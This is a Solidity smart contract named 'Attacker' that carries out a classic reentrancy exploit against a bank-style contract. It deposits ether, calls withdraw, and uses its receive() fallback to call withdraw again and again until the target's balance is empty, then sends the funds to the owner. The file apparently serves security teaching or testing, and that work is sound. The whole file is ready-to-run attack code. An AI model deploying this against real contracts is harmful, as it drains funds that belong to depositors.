// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

interface Ibank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker is Ownable{
    Ibank public immutable bankContract;

    constructor(address bacnkcontractaddress){
        bankContract = Ibank(bacnkcontractaddress);
    }

    function attack() external payable onlyOwner {
         require(msg.value > 0);
        bankContract.deposit{value:msg.value}();
        bankContract.withdraw();
    }

    receive() external payable {
        if (address(bankContract).balance > 0) {
            bankContract.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}